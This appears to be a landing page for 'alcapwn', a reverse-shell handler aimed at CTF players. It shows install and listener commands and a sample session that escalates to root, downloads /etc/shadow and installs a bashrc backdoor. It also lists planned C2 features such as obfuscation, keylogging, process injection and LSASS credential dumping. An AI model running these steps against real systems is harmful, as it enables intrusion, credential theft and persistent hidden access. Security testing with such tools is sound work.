getting started

Install

Pre-built binaries for Linux (amd64 / arm64) are attached to every GitHub release. No runtime dependencies.

one-liner (latest release)
# linux/amd64
$ curl -sL https://github.com/exec/alcapwn/releases/\
latest/download/alcapwn-linux-amd64 \
  -o alcapwn && chmod +x alcapwn
build from source
$ git clone https://github.com/exec/alcapwn
$ cd alcapwn
$ go build -o alcapwn .
start a listener
$ ./alcapwn -l 0.0.0.0:4444          # plain TCP
$ ./alcapwn -l 0.0.0.0:4444 --tls     # ephemeral TLS
$ ./alcapwn -l 0.0.0.0:4444 -r        # auto-recon on connect
capabilities

What it does

alcapwn catches reverse shells and upgrades them to full PTY sessions automatically. From there you have a persistent operator console to recon, escalate, and manage every target simultaneously.

🔍

Automatic recon

Runs a hardened bash recon script on connect. Discovers SUID binaries, sudo rules, capabilities, cron jobs, writable paths, and credentials — parsed and ranked in ~5 s.

⬆️

Auto privilege escalation

Matches findings against 74 GTFOBins/CVE entries. exploit auto <id> walks all non-interactive candidates until root is confirmed or exhausted.

🔒

Transparent TLS

Generates an ephemeral certificate at startup. Existing shells auto-upgrade via a Python relay — no extra tooling on the target.

🛡️

Firewall & allowlists

Per-listener IP allowlists with CIDR support. Connections from unlisted hosts are silently dropped before a session is allocated.

📌

Persistence & reconnect

Install bash/profile backdoors with one command. Reconnecting sessions are auto-labelled by IP — no need to re-rename every time.

📡

Multi-session console

Manage up to 1024 concurrent sessions from a single terminal. Background, foreground, broadcast commands, download/upload files — all without leaving the console.

workflow

Typical CTF run

Once a shell connects, alcapwn upgrades it to a full PTY, then you drive from the operator prompt: 

# Shell connects — PTY upgrade happens automatically
# [+] Session 1 ready  ←  now at the operator prompt

alcapwn> recon 1          # run recon script (or use -r flag at startup)
alcapwn> info 1           # view findings summary
alcapwn> exploit list 1   # show ranked privesc candidates
alcapwn> exploit auto 1   # try them all automatically
# [+] ROOT via suid_bash (euid=0)

alcapwn> use 1            # drop into interactive shell (Ctrl+C to background)
alcapwn> download 1 /etc/shadow
alcapwn> persist 1 bashrc  # install persistence
alcapwn> export 1 --format json findings.json

What's next? The path to a full C2

alcapwn is currently focused on reverse shell management for CTF. To evolve into a full C2 framework, here's what's on the horizon:

  • Stub Generation
    Windows / ELF / Mach-O stager generation
    Generate reverse shell stubs for Windows (PowerShell, C#), Linux ELF, and macOS Mach-O that auto-reconnect and support TLS.
  • Staging
    Multi-stage staging system C2
    Stage0 (tiny dropper) → stage1 (loader) → stage2 (full agent), with encryption and integrity checks between stages.
  • Callbacks
    HTTP/S beacon infrastructure C2
    HTTP listener with routing on User-Agent, path, and headers. Configurable check-in intervals and jitter.
  • Pivoting
    TCP / HTTP / SOCKS5 proxy through sessions
    Route traffic through established sessions to reach otherwise inaccessible internal network segments.
  • Cryptography
    AES-256-GCM encrypted channels
    End-to-end encrypted comms independent of TLS, with ECDH key exchange and per-session keys.
  • Obfuscation
    Payload obfuscation and encoding
    XOR / RC4 / base64 layered encoding, string encryption, and import table obfuscation for stubs.
  • Profiles
    Malleable C2 profiles C2
    Customize traffic patterns, URIs, headers, and timing to mimic legitimate services and blend into normal traffic.
  • Exfil
    Chunked / async file exfiltration
    Background file transfers that survive disconnects, with integrity verification and optional compression.
  • Keylogging
    Cross-platform keylogger module
    Capture keystrokes on Linux (X11/Wayland), macOS, and Windows with periodic flush to operator.
  • Screenshots
    Headless screenshot capture
    Capture the current desktop without spawning a visible window; encode and exfil on demand.
  • Proc Injection
    DLL / .so injection and reflective loading
    Inject into running processes on Windows (CreateRemoteThread / reflective DLL) and Linux (ptrace / LD_PRELOAD).
  • Post-Exploit
    Credential harvesting and LSASS dump
    Automated cred extraction from browser stores, SSH keys, .env files, and Windows LSASS on privilege.
